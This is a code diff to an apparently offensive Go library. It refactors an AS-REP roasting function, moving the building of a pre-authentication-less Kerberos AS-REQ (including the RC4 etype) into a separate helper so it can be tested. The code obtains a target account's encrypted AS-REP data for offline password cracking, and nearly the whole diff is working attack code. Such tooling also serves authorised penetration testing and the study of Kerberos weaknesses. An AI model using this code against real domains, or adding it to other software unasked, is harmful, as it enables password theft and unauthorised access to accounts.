@@ -25,22 +25,19 @@ type ASREPRoastResult struct {
 	CipherText []byte
 }
 
-// ASREPRoast sends an AS-REQ without pre-authentication data for the given username
-// and returns the encrypted part of the AS-REP response for offline cracking.
-//
-// If the account requires pre-authentication the KDC responds with
-// KDC_ERR_PREAUTH_REQUIRED (25) and this function returns an error.
-// If the account does not exist the KDC responds with KDC_ERR_C_PRINCIPAL_UNKNOWN (6).
-func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
-	realm = strings.ToUpper(realm)
-
+// buildASREPRoastReq constructs the pre-auth-less AS-REQ used by ASREPRoast: no
+// PA-DATA (the absence of pre-auth is what makes the account roastable), the
+// target user as cname, krbtgt/REALM as sname, and the strongest-first etype
+// list. It is separated from ASREPRoast so the request shape can be tested
+// without a KDC. realm is assumed already uppercased.
+func buildASREPRoastReq(username, realm string) (*messages.ASReq, error) {
 	var nonce_buf [4]byte
 	if _, err := rand.Read(nonce_buf[:]); err != nil {
 		return nil, fmt.Errorf("asreproast: generate nonce: %w", err)
 	}
 	nonce := int(binary.BigEndian.Uint32(nonce_buf[:]) & 0x7fffffff)
 
-	req := &messages.ASReq{
+	return &messages.ASReq{
 		PVNO:    messages.KerberosV5,
 		MsgType: messages.MsgTypeASReq,
 		// No PAData — absence of pre-auth is what makes the account vulnerable.
@@ -63,6 +60,21 @@ func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
 				messages.ETypeRC4HMAC,
 			},
 		},
+	}, nil
+}
+
+// ASREPRoast sends an AS-REQ without pre-authentication data for the given username
+// and returns the encrypted part of the AS-REP response for offline cracking.
+//
+// If the account requires pre-authentication the KDC responds with
+// KDC_ERR_PREAUTH_REQUIRED (25) and this function returns an error.
+// If the account does not exist the KDC responds with KDC_ERR_C_PRINCIPAL_UNKNOWN (6).
+func ASREPRoast(username, realm, kdcHost string) (*ASREPRoastResult, error) {
+	realm = strings.ToUpper(realm)
+
+	req, err := buildASREPRoastReq(username, realm)
+	if err != nil {
+		return nil, err
 	}
 
 	req_bytes, err := req.Marshal()
